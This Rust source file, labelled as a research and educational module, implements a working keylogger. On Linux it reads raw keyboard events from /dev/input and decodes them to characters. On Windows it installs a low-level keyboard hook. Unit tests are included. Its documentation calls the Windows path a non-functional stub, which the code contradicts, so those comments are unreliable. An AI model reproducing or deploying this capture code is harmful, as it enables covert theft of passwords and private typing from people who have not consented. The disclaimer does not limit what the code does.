//! Keylogging research / educational module.
//!
//! **IMPORTANT**: This module is provided **for research and educational
//! purposes only**. Unauthorised use of keyloggers violates applicable
//! laws and privacy rights. The implementations here demonstrate the
//! underlying mechanisms (Windows HID API, Linux evdev) to help
//! security researchers understand how input capture works, so they
//! can build effective countermeasures.
//!
//! # Platforms
//!
//! - **Linux (`cfg(target_os = "linux")`)**: Uses the evdev interface
//!   (`/dev/input/event*`). Finding keyboard devices requires reading
//!   `/proc/bus/input/devices`; capturing input from `/dev/input/event*`
//!   requires **root** permissions (or a `CAP_DAC_READ_SEARCH` +
//!   `CAP_SYS_ADMIN` capability set).
//!
//! - **Windows (`cfg(windows)`)**: Outlines the
//!   `SetWindowsHookEx(WH_KEYBOARD_LL)` / `GetMessage` approach in doc
//!   comments; the trait implementation is a stub that returns an error.
//!
//! # Safety
//!
//! The Linux evdev path performs raw `read()` calls on file descriptors
//! into a `repr(C)` struct. These operations are inherently unsafe but
//! are contained behind a safe API through `unsafe` blocks. The
//! `EvdevKeyLogger` will never capture keys on any machine where it
//! does not have the necessary permissions.

use std::collections::VecDeque;
use std::time::Instant;

#[cfg(target_os = "linux")]
use std::io;
#[cfg(target_os = "linux")]
use std::os::fd::AsRawFd;
#[cfg(target_os = "linux")]
use std::path::PathBuf;

// ---------------------------------------------------------------------------
// Core data types
// ---------------------------------------------------------------------------

/// A single captured key event.
#[derive(Debug, Clone, PartialEq)]
pub struct KeyEvent {
    /// Raw scancode or key-code value as reported by the input device.
    pub key_code: u16,
    /// Decoded character, if one can be determined (e.g., `'a'`, `'1'`).
    /// `None` for non-printable keys such as Shift, Ctrl, etc.
    pub key_char: Option<char>,
    /// Monotonic timestamp of when the event was recorded.
    pub timestamp: Instant,
    /// `true` when the key was pressed down, `false` when released.
    pub is_key_down: bool,
}

impl KeyEvent {
    /// Construct a new `KeyEvent`.
    #[must_use]
    pub fn new(key_code: u16, key_char: Option<char>, is_key_down: bool) -> Self {
        Self {
            key_code,
            key_char,
            timestamp: Instant::now(),
            is_key_down,
        }
    }
}

// ---------------------------------------------------------------------------
// KeyLogger trait
// ---------------------------------------------------------------------------

/// Trait for capturing keyboard input events.
///
/// Implementations may be platform-specific and require elevated
/// privileges. See the module-level documentation for details.
pub trait KeyLogger {
    /// Start capturing keyboard input.
    ///
    /// Returns an error if the platform does not support keylogging,
    /// permissions are insufficient, or the device cannot be opened.
    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>>;

    /// Stop capturing keyboard input and release any resources held
    /// (e.g., file descriptors, hooks).
    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>>;

    /// Drain all buffered key events since the last call.
    fn read_events(&mut self) -> Vec<KeyEvent>;
}

// ---------------------------------------------------------------------------
// Linux evdev implementation
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
/// Linux input_event structure as defined in `<linux/input.h>`.
///
/// The kernel publishes events from `/dev/input/event*` as an array of
/// these 16-byte (or 24-byte with time padding) structs.
///
/// This `repr(C)` layout matches the kernel ABI exactly.
#[repr(C)]
#[derive(Debug, Clone, Copy, Default)]
#[allow(non_camel_case_types)]
pub struct libc_input_event {
    /// Seconds portion of the timestamp (epoch).
    tv_sec: i64,
    /// Microseconds portion of the timestamp.
    tv_usec: i64,
    /// Event type (e.g., `1` for `EV_KEY`, `0` for `EV_SYN`).
    type_: u16,
    /// Key code (e.g., `KEY_A = 30`, `KEY_ENTER = 28`).
    code: u16,
    /// Value: `0` = key release, `1` = key press, `2` = autorepeat.
    value: i32,
}

/// Event type constants from `<linux/input-event-codes.h>`.
#[cfg(target_os = "linux")]
const EV_SYN: u16 = 0x00;
#[cfg(target_os = "linux")]
const EV_KEY: u16 = 0x01;

/// Synchronisation event codes.
#[cfg(target_os = "linux")]
const SYN_REPORT: u16 = 0;

/// Size of a `libc_input_event` on a 64-bit Linux system.
#[cfg(target_os = "linux")]
const INPUT_EVENT_SIZE: usize = 24;

/// A lightweight mapping of evdev key codes to printable `char` values
/// for US-QWERTY-like layouts.
///
/// This is an **incomplete research example** — a production tool would
/// need to query the X11/wayland keymap or read the console keymap.
fn evdev_keycode_to_char(code: u16, shifted: bool) -> Option<char> {
    match (code, shifted) {
        (16, false) => Some('q'), (16, true) => Some('Q'),
        (17, false) => Some('w'), (17, true) => Some('W'),
        (18, false) => Some('e'), (18, true) => Some('E'),
        (19, false) => Some('r'), (19, true) => Some('R'),
        (20, false) => Some('t'), (20, true) => Some('T'),
        (21, false) => Some('y'), (21, true) => Some('Y'),
        (22, false) => Some('u'), (22, true) => Some('U'),
        (23, false) => Some('i'), (23, true) => Some('I'),
        (24, false) => Some('o'), (24, true) => Some('O'),
        (25, false) => Some('p'), (25, true) => Some('P'),
        (30, false) => Some('a'), (30, true) => Some('A'),
        (31, false) => Some('s'), (31, true) => Some('S'),
        (32, false) => Some('d'), (32, true) => Some('D'),
        (33, false) => Some('f'), (33, true) => Some('F'),
        (34, false) => Some('g'), (34, true) => Some('G'),
        (35, false) => Some('h'), (35, true) => Some('H'),
        (36, false) => Some('j'), (36, true) => Some('J'),
        (37, false) => Some('k'), (37, true) => Some('K'),
        (38, false) => Some('l'), (38, true) => Some('L'),
        (44, false) => Some('z'), (44, true) => Some('Z'),
        (45, false) => Some('x'), (45, true) => Some('X'),
        (46, false) => Some('c'), (46, true) => Some('C'),
        (47, false) => Some('v'), (47, true) => Some('V'),
        (48, false) => Some('b'), (48, true) => Some('B'),
        (49, false) => Some('n'), (49, true) => Some('N'),
        (50, false) => Some('m'), (50, true) => Some('M'),
        (2, false) => Some('1'), (2, true) => Some('!'),
        (3, false) => Some('2'), (3, true) => Some('@'),
        (4, false) => Some('3'), (4, true) => Some('#'),
        (5, false) => Some('4'), (5, true) => Some('$'),
        (6, false) => Some('5'), (6, true) => Some('%'),
        (7, false) => Some('6'), (7, true) => Some('^'),
        (8, false) => Some('7'), (8, true) => Some('&'),
        (9, false) => Some('8'), (9, true) => Some('*'),
        (10, false) => Some('9'), (10, true) => Some('('),
        (11, false) => Some('0'), (11, true) => Some(')'),
        (57, false) => Some(' '),
        (12, false) => Some('-'), (12, true) => Some('_'),
        (13, false) => Some('='), (13, true) => Some('+'),
        (26, false) => Some('['), (26, true) => Some('{'),
        (27, false) => Some(']'), (27, true) => Some('}'),
        (39, false) => Some(';'), (39, true) => Some(':'),
        (40, false) => Some('\''), (40, true) => Some('"'),
        (41, false) => Some('`'), (41, true) => Some('~'),
        (43, false) => Some('\\'), (43, true) => Some('|'),
        (51, false) => Some(','), (51, true) => Some('<'),
        (52, false) => Some('.'), (52, true) => Some('>'),
        (53, false) => Some('/'), (53, true) => Some('?'),
        _ => None,
    }
}

#[cfg(target_os = "linux")]
/// Linux evdev-based keylogger.
///
/// Reads raw `input_event` records from `/dev/input/event*` device
/// files. This is a **research / educational** implementation.
///
/// # Privileges
///
/// Opening `/dev/input/event*` requires **root** or the
/// `CAP_DAC_READ_SEARCH` + `CAP_SYS_ADMIN` capabilities. Without these,
/// `start()` will return an `io::Error` with kind `PermissionDenied`.
///
/// # Usage
///
/// ```no_run
/// use agent_hardening::keylog::EvdevKeyLogger;
/// use agent_hardening::keylog::KeyLogger;
///
/// let mut logger = EvdevKeyLogger::new().expect("failed to create logger");
/// if let Err(e) = logger.start() {
///     eprintln!("Cannot start evdev keylogger: {e} (root required)");
/// }
/// let events = logger.read_events();
/// println!("Captured {} events", events.len());
/// logger.stop().ok();
/// ```
pub struct EvdevKeyLogger {
    devices: Vec<PathBuf>,
    handles: Vec<std::fs::File>,
    buffer: VecDeque<KeyEvent>,
    running: bool,
    shift_pressed: bool,
}

#[cfg(target_os = "linux")]
impl EvdevKeyLogger {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let devices = Self::find_keyboard_devices()?;
        Ok(Self {
            devices,
            handles: Vec::new(),
            buffer: VecDeque::new(),
            running: false,
            shift_pressed: false,
        })
    }

    /// Enumerate keyboard input devices by parsing `/proc/bus/input/devices`.
    pub fn find_keyboard_devices() -> io::Result<Vec<PathBuf>> {
        let contents = std::fs::read_to_string("/proc/bus/input/devices")?;
        let mut devices = Vec::new();
        let mut in_keyboard = false;

        for line in contents.lines() {
            if line.starts_with("I:") { in_keyboard = false; }
            if line.starts_with("N:") && line.contains("kbd") { in_keyboard = true; }
            if in_keyboard && line.starts_with("H:") {
                for word in line.split_whitespace() {
                    if word.starts_with("event") && word.len() > 5
                        && word[5..].chars().all(|c| c.is_ascii_digit())
                    {
                        devices.push(PathBuf::from(format!("/dev/input/{}", word)));
                    }
                }
            }
        }
        Ok(devices)
    }

    fn translate_key(&mut self, code: u16, value: i32) -> Option<char> {
        if code == 42 || code == 54 {
            self.shift_pressed = value != 0;
            return None;
        }
        evdev_keycode_to_char(code, self.shift_pressed)
    }

    fn poll_devices(&mut self) {
        let fds: Vec<_> = self.handles.iter().map(|h| h.as_raw_fd()).collect();
        for fd in fds {
            loop {
                let mut raw: libc_input_event = Default::default();
                let buf: &mut [u8] = unsafe {
                    std::slice::from_raw_parts_mut(&mut raw as *mut _ as *mut u8, INPUT_EVENT_SIZE)
                };
                let n = unsafe {
                    libc::read(fd, buf.as_mut_ptr() as *mut libc::c_void, INPUT_EVENT_SIZE)
                };
                if n < 0 { break; }
                if n as usize != INPUT_EVENT_SIZE { break; }
                if raw.type_ == EV_KEY {
                    let is_down = raw.value == 1;
                    let key_char = self.translate_key(raw.code, raw.value);
                    self.buffer.push_back(KeyEvent {
                        key_code: raw.code,
                        key_char,
                        timestamp: Instant::now(),
                        is_key_down: is_down,
                    });
                }
            }
        }
    }
}

#[cfg(target_os = "linux")]
const KEY_ENTER: u16 = 28;
#[cfg(target_os = "linux")]
const KEY_BACKSPACE: u16 = 14;
#[cfg(target_os = "linux")]
const KEY_TAB: u16 = 15;
#[cfg(target_os = "linux")]
const KEY_ESC: u16 = 1;

#[cfg(target_os = "linux")]
impl KeyLogger for EvdevKeyLogger {
    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.running { return Ok(()); }
        if self.devices.is_empty() {
            return Err("no keyboard devices found; are you running as root?".into());
        }
        for dev_path in &self.devices {
            let file = match std::fs::File::open(dev_path) {
                Ok(f) => f,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    eprintln!("[keylog] Cannot open {}: {e}", dev_path.display());
                    continue;
                }
            };
            unsafe {
                let fd = file.as_raw_fd();
                let flags = libc::fcntl(fd, libc::F_GETFL, 0);
                if flags >= 0 {
                    libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK);
                }
            }
            self.handles.push(file);
        }
        if self.handles.is_empty() {
            return Err("could not open any keyboard device (root required)".into());
        }
        self.running = true;
        Ok(())
    }

    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.handles.clear();
        self.running = false;
        Ok(())
    }

    fn read_events(&mut self) -> Vec<KeyEvent> {
        if self.running { self.poll_devices(); }
        self.buffer.drain(..).collect()
    }
}

// ---------------------------------------------------------------------------
// Windows implementation — SetWindowsHookEx(WH_KEYBOARD_LL)
// ---------------------------------------------------------------------------

#[cfg(windows)]
use windows::Win32::UI::WindowsAndMessaging::HHOOK;

#[cfg(windows)]
pub struct WindowsKeyLogger {
    hook: HHOOK,
    buffer: VecDeque<KeyEvent>,
    running: bool,
}

// Thread-local storage for the shared buffer pointer.
#[cfg(windows)]
thread_local! {
    static SHARED_BUFFER: std::cell::RefCell<Option<*mut VecDeque<KeyEvent>>> = std::cell::RefCell::new(None);
}

/// Low-level keyboard hook callback.
#[cfg(windows)]
unsafe extern "system" fn keyboard_hook_callback(
    code: i32,
    wparam: windows::Win32::Foundation::WPARAM,
    lparam: windows::Win32::Foundation::LPARAM,
) -> windows::Win32::Foundation::LRESULT {
    use windows::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, KBDLLHOOKSTRUCT, WM_KEYDOWN, WM_SYSKEYDOWN,
    };

    if code >= 0 {
        let kb = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
        let is_key_down = wparam.0 as u32 == WM_KEYDOWN
            || wparam.0 as u32 == WM_SYSKEYDOWN;

        let event = KeyEvent::new(kb.vkCode as u16, None, is_key_down);

        SHARED_BUFFER.with(|cell| {
            if let Some(ptr) = *cell.borrow() {
                (*ptr).push_back(event);
            }
        });
    }

    // Pass to the next hook in the chain.
    CallNextHookEx(None, code, wparam, lparam)
}

#[cfg(windows)]
impl WindowsKeyLogger {
    #[must_use]
    pub fn new() -> Self {
        Self {
            hook: HHOOK::default(),
            buffer: VecDeque::new(),
            running: false,
        }
    }
}

#[cfg(windows)]
impl KeyLogger for WindowsKeyLogger {
    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        use windows::Win32::UI::WindowsAndMessaging::{SetWindowsHookExW, WH_KEYBOARD_LL};

        if self.running {
            return Ok(());
        }

        // Register the buffer pointer in thread-local storage so the
        // callback can push events into it.
        let buf_ptr: *mut VecDeque<KeyEvent> = &mut self.buffer;
        SHARED_BUFFER.with(|cell| *cell.borrow_mut() = Some(buf_ptr));

        // Install the low-level keyboard hook.
        let hook = unsafe {
            SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook_callback), None, 0)
        }
        .map_err(|_| "SetWindowsHookExW failed")?;

        if hook.is_invalid() {
            return Err("SetWindowsHookExW returned invalid hook".into());
        }

        self.hook = hook;
        self.running = true;

        // In a real application, a message loop must be running on this
        // thread for the hook to receive events. The caller is responsible
        // for pumping messages (e.g., via GetMessage/DispatchMessage).
        Ok(())
    }

    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        use windows::Win32::UI::WindowsAndMessaging::UnhookWindowsHookEx;

        if !self.running {
            return Ok(());
        }

        unsafe {
            let _ = UnhookWindowsHookEx(self.hook);
        }

        SHARED_BUFFER.with(|cell| *cell.borrow_mut() = None);

        self.running = false;
        Ok(())
    }

    fn read_events(&mut self) -> Vec<KeyEvent> {
        self.buffer.drain(..).collect()
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn key_event_construction() {
        let event = KeyEvent::new(30, Some('a'), true);
        assert_eq!(event.key_code, 30);
        assert_eq!(event.key_char, Some('a'));
        assert!(event.is_key_down);

        let event2 = KeyEvent::new(42, None, false);
        assert_eq!(event2.key_code, 42);
        assert_eq!(event2.key_char, None);
        assert!(!event2.is_key_down);
    }

    #[test]
    fn key_event_debug_and_eq() {
        let a = KeyEvent::new(57, Some(' '), true);
        let b = KeyEvent::new(57, Some(' '), true);
        assert_ne!(a, b);
        let _ = format!("{a:?}");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn device_enumeration_returns_vec() {
        let devices = EvdevKeyLogger::find_keyboard_devices().unwrap_or_default();
        assert!(devices.iter().all(|p| { p.to_string_lossy().starts_with("/dev/input/event") }));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn evdev_logger_creation() {
        let result = EvdevKeyLogger::new();
        if let Ok(logger) = result {
            assert!(!logger.running);
            assert!(logger.buffer.is_empty());
        }
    }

    #[test]
    fn keycode_to_char_basic() {
        assert_eq!(evdev_keycode_to_char(30, false), Some('a'));
        assert_eq!(evdev_keycode_to_char(30, true), Some('A'));
        assert_eq!(evdev_keycode_to_char(2, false), Some('1'));
        assert_eq!(evdev_keycode_to_char(2, true), Some('!'));
        assert_eq!(evdev_keycode_to_char(57, false), Some(' '));
        assert_eq!(evdev_keycode_to_char(255, false), None);
    }

    #[test]
    fn keylogger_trait_object() {
        fn _assert_object_safe(_: &dyn KeyLogger) {}
        let _ = _assert_object_safe;
    }
}
